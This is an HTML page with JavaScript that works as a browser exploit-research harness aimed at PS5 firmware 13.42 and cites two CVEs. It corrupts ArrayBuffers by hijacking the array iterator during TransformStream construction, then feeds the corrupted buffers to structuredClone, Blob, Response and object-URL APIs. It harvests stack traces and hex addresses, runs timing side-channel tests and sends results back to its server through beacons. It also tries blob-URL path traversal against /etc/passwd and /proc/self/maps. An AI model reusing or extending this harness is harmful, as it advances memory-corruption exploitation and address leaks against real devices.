
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 — Crash Info Leak Hunt (CVE-2026-43716 + 43732)</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; }
button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; margin: 4px; cursor: pointer; font-family: monospace; font-size: 11px; }
button:hover { background: #0f0; color: #000; }
#out { background: #111; border: 1px solid #333; padding: 15px; margin-top: 15px; white-space: pre-wrap; max-height: 600px; overflow-y: auto; font-size: 11px; }
.danger { color: #f44; }
.safe { color: #0f0; }
.warn { color: #fa0; }
.info { color: #88f; }
</style>
</head>
<body>
<h3>💀 Crash Info Leak Hunt — PS5 FW 13.42</h3>
<p>Capture stack traces, error details, and side-channels from corrupted ArrayBuffer operations.</p>

<div>
  <b>Phase A — Crash with Stack Capture:</b><br>
  <button onclick="run('S1')">S1: structuredClone transfer (B2)</button>
  <button onclick="run('S2')">S2: Blob + FileReader (C2)</button>
  <button onclick="run('S3')">S3: Response.arrayBuffer (C3)</button>
  <button onclick="run('S4')">S4: URL.createObjectURL (C4)</button>
  <br><br>
  <b>Phase B — Error Object Analysis:</b><br>
  <button onclick="run('E1')">E1: Error.stack on corruption</button>
  <button onclick="run('E2')">E2: Error.prepareStackTrace shim</button>
  <button onclick="run('E3')">E3: Promise rejection details</button>
  <button onclick="run('E4')">E4: Cross-origin error diff</button>
  <br><br>
  <b>Phase C — Side-Channel Timing:</b><br>
  <button onclick="run('T1')">T1: Timing slice() vs transfer()</button>
  <button onclick="run('T2')">T2: Timing corrupted vs clean</button>
  <button onclick="run('T3')">T3: Memory pressure timing</button>
  <br><br>
  <b>Phase D — CVE-2026-43732 Blob Tests:</b><br>
  <button onclick="run('B1')">B1: Blob URL origin leak</button>
  <button onclick="run('B2')">B2: Blob URL path traversal</button>
  <button onclick="run('B3')">B3: Cross-origin blob access</button>
  <button onclick="run('B4')">B4: Blob subresource IPC</button>
  <br><br>
  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear Log</button>
</div>

<hr>
<pre id="out"></pre>

<script>
var pageId = Math.random().toString(36).slice(2, 8);
var currentVariant = 'menu';
var originalIterator = Array.prototype[Symbol.iterator];

function beacon(m) {
    try { navigator.sendBeacon('/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m)); } catch(e){}
    try { var i = new Image(); i.src = '/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m); } catch(e){}
    var out = document.getElementById('out');
    var line = document.createElement('div');
    var ts = new Date().toLocaleTimeString();
    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1 || m.indexOf('DIED') !== -1) line.className = 'danger';
    else if (m.indexOf('⚠️') !== -1 || m.indexOf('THREW') !== -1) line.className = 'warn';
    else if (m.indexOf('📊') !== -1 || m.indexOf('INFO') !== -1) line.className = 'info';
    else line.className = 'safe';
    line.textContent = '[' + ts + '] ' + m;
    out.appendChild(line);
    out.scrollTop = out.scrollHeight;
}

function clearOut() {
    document.getElementById('out').innerHTML = '';
    beacon('=== log cleared ===');
}

function buildFake(slot1Value) {
    var fake = { a: 0, b: slot1Value, c: 0 };
    Array.prototype[Symbol.iterator] = function() {
        var arr = this, i = 0;
        return {
            next: function() {
                if (i >= arr.length) return { done: true };
                var val = arr[i];
                if (arr.length === 3 && i >= 1) val = fake;
                i++;
                return { value: val, done: false };
            }
        };
    };
    var ts = null;
    try { ts = new TransformStream(); } catch(e) { beacon('construct THREW ' + e.name); }
    Array.prototype[Symbol.iterator] = originalIterator;
    return ts;
}

function captureError(name, fn) {
    beacon('> ' + name);
    try {
        var t0 = performance.now();
        var result = fn();
        var t1 = performance.now();
        
        if (result && typeof result.then === 'function') {
            result.then(function(v) {
                beacon(name + ' ✅ RESOLVED | dt=' + (performance.now()-t0).toFixed(2) + 'ms | val=' + String(v).slice(0,80));
            }).catch(function(e) {
                var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
                var stack = '';
                try { stack = (e.stack || '').slice(0,300); } catch(ex){}
                beacon(name + ' ⚠️ REJECTED | ' + info);
                if (stack) beacon('  stack=' + stack);
            });
        } else {
            beacon(name + ' ✅ OK | dt=' + (t1-t0).toFixed(2) + 'ms | val=' + String(result).slice(0,80));
        }
    } catch(e) {
        var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
        var stack = '';
        try { stack = (e.stack || '').slice(0,400); } catch(ex){}
        beacon(name + ' 💀 THREW | ' + info);
        if (stack) beacon('  stack=' + stack);
        
        // Try to extract any numeric values from error
        var nums = String(e.message).match(/0x[0-9a-fA-F]+/g);
        if (nums) beacon('  📊 HEX_IN_ERROR=' + nums.join(' '));
        var nums2 = String(e.stack).match(/0x[0-9a-fA-F]+/g);
        if (nums2) beacon('  📊 HEX_IN_STACK=' + nums2.join(' '));
    }
}

var RUNS = {};

// ===== Phase A — Crash with Stack Capture =====

RUNS['S1'] = function() {
    beacon('=== S1: structuredClone transfer (B2 crash path) ===');
    var ab = new ArrayBuffer(0x100);
    var ts = buildFake(ab);
    if (!ts) { beacon('build failed'); return; }
    beacon('AB corrupted — attempting transfer...');
    
    captureError('structuredClone.transfer', function() {
        return structuredClone(ab, { transfer: [ab] });
    });
    
    // Also try without transfer option
    captureError('structuredClone.noTransfer', function() {
        return structuredClone(ab);
    });
    
    beacon('done');
};

RUNS['S2'] = function() {
    beacon('=== S2: Blob + FileReader (C2 crash path) ===');
    var ab = new ArrayBuffer(0x100);
    var view = new Uint8Array(ab);
    view[0] = 0x41;
    
    var ts = buildFake(ab);
    if (!ts) return;
    beacon('AB corrupted — Blob/FileReader...');
    
    captureError('Blob.constructor', function() {
        return new Blob([ab]);
    });
    
    captureError('FileReader.readAsArrayBuffer', function() {
        return new Promise(function(resolve, reject) {
            var blob = new Blob(['test']);
            var reader = new FileReader();
            reader.onload = function(e) { resolve('loaded ' + e.target.result.byteLength); };
            reader.onerror = function(e) { reject(new Error(reader.error.name)); };
            reader.readAsArrayBuffer(blob);
        });
    });
    
    captureError('FileReader.readAsText(corruptedBlob)', function() {
        return new Promise(function(resolve, reject) {
            try {
                var blob = new Blob([ab]);
                var reader = new FileReader();
                reader.onload = function(e) { resolve('text=' + e.target.result.slice(0,50)); };
                reader.onerror = function(e) { reject(new Error(reader.error.name)); };
                reader.readAsText(blob);
            } catch(e) { reject(e); }
        });
    });
    
    beacon('done');
};

RUNS['S3'] = function() {
    beacon('=== S3: Response.arrayBuffer (C3 crash path) ===');
    var ab = new ArrayBuffer(0x100);
    var ts = buildFake(ab);
    if (!ts) return;
    beacon('AB corrupted — Response...');
    
    captureError('Response.fromBlob', function() {
        var blob = new Blob([ab]);
        return new Response(blob);
    });
    
    captureError('Response.arrayBuffer', function() {
        var blob = new Blob(['test']);
        var resp = new Response(blob);
        return resp.arrayBuffer();
    });
    
    captureError('Response(corrupted).arrayBuffer', function() {
        var blob = new Blob([ab]);
        var resp = new Response(blob);
        return resp.arrayBuffer();
    });
    
    beacon('done');
};

RUNS['S4'] = function() {
    beacon('=== S4: URL.createObjectURL (C4 crash path) ===');
    var ab = new ArrayBuffer(0x100);
    var ts = buildFake(ab);
    if (!ts) return;
    beacon('AB corrupted — URL.createObjectURL...');
    
    captureError('URL.createObjectURL(Blob)', function() {
        var blob = new Blob([ab]);
        var url = URL.createObjectURL(blob);
        return 'url=' + url;
    });
    
    captureError('URL.createObjectURL(Blob-clean)', function() {
        var blob = new Blob(['clean']);
        var url = URL.createObjectURL(blob);
        return 'clean_url=' + url;
    });
    
    beacon('done');
};

// ===== Phase B — Error Object Analysis =====

RUNS['E1'] = function() {
    beacon('=== E1: Error.stack on corruption ===');
    var ab = new ArrayBuffer(0x100);
    var ts = buildFake(ab);
    if (!ts) return;
    
    try {
        structuredClone(ab, { transfer: [ab] });
    } catch(e) {
        beacon('📊 Error.name=' + e.name);
        beacon('📊 Error.message=' + String(e.message).slice(0,200));
        beacon('📊 Error.stack=' + (e.stack || 'none').slice(0,500));
        
        // Enumerate all properties
        var props = [];
        for (var k in e) { props.push(k + '=' + String(e[k]).slice(0,50)); }
        beacon('📊 Error.props=' + props.join(', ').slice(0,300));
        
        // Try toString variants
        beacon('📊 e.toString()=' + e.toString().slice(0,100));
        try { beacon('📊 e.toSource?=' + (typeof e.toSource)); } catch(ex){}
    }
    beacon('done');
};

RUNS['E2'] = function() {
    beacon('=== E2: Error.prepareStackTrace shim ===');
    // Even if undefined, try to set it and see behavior
    beacon('typeof Error.prepareStackTrace=' + typeof Error.prepareStackTrace);
    
    try {
        Error.prepareStackTrace = function(err, stack) {
            beacon('📊 prepareStackTrace CALLED!');
            try {
                var frames = stack.map(function(f) {
                    return f.getFunctionName() + '@' + f.getLineNumber();
                });
                beacon('📊 frames=' + frames.join(',').slice(0,200));
            } catch(ex) {}
            return stack;
        };
        beacon('set prepareStackTrace OK');
    } catch(e) {
        beacon('set prepareStackTrace THREW ' + e.name);
    }
    
    // Trigger an error to test
    try {
        var ab = new ArrayBuffer(0x100);
        var ts = buildFake(ab);
        structuredClone(ab, { transfer: [ab] });
    } catch(e) {
        beacon('Error after shim: ' + e.name);
    }
    
    try { Error.prepareStackTrace = undefined; } catch(e){}
    beacon('done');
};

RUNS['E3'] = function() {
    beacon('=== E3: Promise rejection details ===');
    var ab = new ArrayBuffer(0x100);
    var ts = buildFake(ab);
    if (!ts) return;
    
    Promise.resolve().then(function() {
        return structuredClone(ab, { transfer: [ab] });
    }).catch(function(e) {
        beacon('📊 Promise rejection: ' + e.name);
        beacon('📊 Message: ' + String(e.message).slice(0,150));
        beacon('📊 Stack: ' + (e.stack || 'none').slice(0,300));
        
        // Check if rejection reason has extra properties
        var keys = Object.getOwnPropertyNames(e);
        beacon('📊 OwnProps: ' + keys.join(', '));
    });
    
    beacon('Promise scheduled');
};

RUNS['E4'] = function() {
    beacon('=== E4: Cross-origin error diff ===');
    // Compare error messages from same-origin vs cross-origin
    // This might reveal internal details
    
    var errors = [];
    
    // Error 1: clean AB
    try {
        var clean = new ArrayBuffer(0x10);
        structuredClone(clean, { transfer: [clean] });
    } catch(e) {
        errors.push('clean:' + e.name + ':' + String(e.message).slice(0,50));
    }
    
    // Error 2: corrupted AB
    try {
        var ab = new ArrayBuffer(0x100);
        var ts = buildFake(ab);
        structuredClone(ab, { transfer: [ab] });
    } catch(e) {
        errors.push('corrupt:' + e.name + ':' + String(e.message).slice(0,50));
    }
    
    beacon('📊 Error diff:');
    errors.forEach(function(e) { beacon('  ' + e); });
    beacon('done');
};

// ===== Phase C — Side-Channel Timing =====

RUNS['T1'] = function() {
    beacon('=== T1: Timing slice() vs transfer() ===');
    var iterations = 100;
    
    // Clean AB timing
    var cleanSlice = 0, cleanTransfer = 0;
    for (var i = 0; i < iterations; i++) {
        var ab = new ArrayBuffer(0x1000);
        var t0 = performance.now();
        var s = ab.slice(0, 0x100);
        cleanSlice += performance.now() - t0;
        
        ab = new ArrayBuffer(0x1000);
        t0 = performance.now();
        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
        cleanTransfer += performance.now() - t0;
    }
    
    beacon('📊 Clean: slice=' + (cleanSlice/iterations).toFixed(4) + 'ms transfer=' + (cleanTransfer/iterations).toFixed(4) + 'ms');
    
    // Corrupted AB timing
    var corruptSlice = 0, corruptTransfer = 0;
    for (var i = 0; i < iterations; i++) {
        var ab = new ArrayBuffer(0x1000);
        var ts = buildFake(ab);
        
        var t0 = performance.now();
        var s = ab.slice(0, 0x100);
        corruptSlice += performance.now() - t0;
        
        ab = new ArrayBuffer(0x1000);
        ts = buildFake(ab);
        t0 = performance.now();
        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
        corruptTransfer += performance.now() - t0;
    }
    
    beacon('📊 Corrupt: slice=' + (corruptSlice/iterations).toFixed(4) + 'ms transfer=' + (corruptTransfer/iterations).toFixed(4) + 'ms');
    beacon('done');
};

RUNS['T2'] = function() {
    beacon('=== T2: Timing corrupted vs clean ===');
    // Measure time to create TransformStream with corrupted AB
    
    var cleanTime = 0, corruptTime = 0;
    var n = 50;
    
    for (var i = 0; i < n; i++) {
        var t0 = performance.now();
        var ab = new ArrayBuffer(0x100);
        var ts = new TransformStream();
        cleanTime += performance.now() - t0;
    }
    
    for (var i = 0; i < n; i++) {
        var t0 = performance.now();
        var ab = new ArrayBuffer(0x100);
        var ts = buildFake(ab);
        corruptTime += performance.now() - t0;
    }
    
    beacon('📊 Clean TS create=' + (cleanTime/n).toFixed(4) + 'ms');
    beacon('📊 Corrupt TS create=' + (corruptTime/n).toFixed(4) + 'ms');
    beacon('📊 Delta=' + ((corruptTime-cleanTime)/n).toFixed(4) + 'ms');
    beacon('done');
};

RUNS['T3'] = function() {
    beacon('=== T3: Memory pressure timing ===');
    var ab = new ArrayBuffer(0x100000);
    var ts = buildFake(ab);
    if (!ts) return;
    
    // Allocate pressure
    var pressure = [];
    var t0 = performance.now();
    for (var i = 0; i < 100; i++) {
        pressure.push(new ArrayBuffer(0x10000));
    }
    var allocTime = performance.now() - t0;
    
    beacon('📊 Alloc 100MB=' + allocTime.toFixed(2) + 'ms');
    
    // Try accessing corrupted AB under pressure
    t0 = performance.now();
    try {
        var blob = new Blob([ab]);
    } catch(e) {
        beacon('📊 Blob under pressure THREW ' + e.name);
    }
    var blobTime = performance.now() - t0;
    beacon('📊 Blob create under pressure=' + blobTime.toFixed(4) + 'ms');
    
    pressure = null;
    beacon('done');
};

// ===== Phase D — CVE-2026-43732 Blob Tests =====

RUNS['B1'] = function() {
    beacon('=== B1: Blob URL origin leak ===');
    
    // Create blob from different sources and compare URLs
    var blob1 = new Blob(['test1']);
    var blob2 = new Blob(['test2']);
    var url1 = URL.createObjectURL(blob1);
    var url2 = URL.createObjectURL(blob2);
    
    beacon('📊 blob1 URL=' + url1);
    beacon('📊 blob2 URL=' + url2);
    
    // Try to extract origin from URL
    try {
        var u = new URL(url1);
        beacon('📊 protocol=' + u.protocol);
        beacon('📊 host=' + u.host);
        beacon('📊 pathname=' + u.pathname.slice(0,50));
        beacon('📊 hash=' + u.hash);
    } catch(e) {
        beacon('URL parse THREW ' + e.name);
    }
    
    URL.revokeObjectURL(url1);
    URL.revokeObjectURL(url2);
    beacon('done');
};

RUNS['B2'] = function() {
    beacon('=== B2: Blob URL path traversal ===');
    
    var tests = [
        'blob:../../../../etc/passwd',
        'blob:../../../proc/self/maps',
        'blob:..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        'blob:/sdcard/test',
        'blob:/data/local/tmp/test',
        'blob:/user/home/test'
    ];
    
    tests.forEach(function(url) {
        captureError('fetch(' + url.slice(0,30) + '...)', function() {
            return fetch(url).then(function(r) { return r.text(); });
        });
    });
    
    beacon('done');
};

RUNS['B3'] = function() {
    beacon('=== B3: Cross-origin blob access ===');
    
    // Create blob, get URL, try cross-origin access patterns
    var blob = new Blob(['secret_data_12345']);
    var url = URL.createObjectURL(blob);
    
    beacon('📊 Blob URL=' + url);
    
    // Try fetch with different modes
    captureError('fetch.blob.no-cors', function() {
        return fetch(url, { mode: 'no-cors' }).then(function(r) { return 'status=' + r.status; });
    });
    
    captureError('fetch.blob.cors', function() {
        return fetch(url, { mode: 'cors' }).then(function(r) { return 'status=' + r.status; });
    });
    
    // Try iframe
    captureError('iframe.blob', function() {
        return new Promise(function(resolve) {
            var f = document.createElement('iframe');
            f.src = url;
            f.onload = function() { resolve('iframe loaded'); };
            f.onerror = function() { resolve('iframe error'); };
            document.body.appendChild(f);
            setTimeout(function() { resolve('iframe timeout'); }, 2000);
        });
    });
    
    URL.revokeObjectURL(url);
    beacon('done');
};

RUNS['B4'] = function() {
    beacon('=== B4: Blob subresource IPC ===');
    
    // Test if blob URLs can be used in contexts that trigger IPC
    var blob = new Blob(['<script>parent.postMessage("from_blob", "*");<\/script>'], { type: 'text/html' });
    var url = URL.createObjectURL(blob);
    
    beacon('📊 Blob HTML URL=' + url);
    
    // Try as image src (triggers NetworkProcess load)
    captureError('Image.blob.src', function() {
        return new Promise(function(resolve) {
            var img = new Image();
            img.onload = function() { resolve('img loaded'); };
            img.onerror = function() { resolve('img error'); };
            img.src = url;
            setTimeout(function() { resolve('img timeout'); }, 2000);
        });
    });
    
    // Try as script src
    captureError('Script.blob.src', function() {
        return new Promise(function(resolve) {
            var s = document.createElement('script');
            s.onload = function() { resolve('script loaded'); };
            s.onerror = function() { resolve('script error'); };
            s.src = url;
            document.head.appendChild(s);
            setTimeout(function() { resolve('script timeout'); }, 2000);
        });
    });
    
    URL.revokeObjectURL(url);
    beacon('done');
};

// ===== Main Runner =====
function run(v) {
    currentVariant = v;
    beacon('\\n>>> BOOT v=' + v + ' <<<');
    try {
        RUNS[v]();
    } catch(e) {
        beacon('💀 RUN THREW ' + e.name + ': ' + e.message);
    }
}

beacon('\\n🟢 Crash Info Leak Hunt Loaded');
beacon('If any operation crashes, check the error stack for memory addresses.');
</script>
</body>
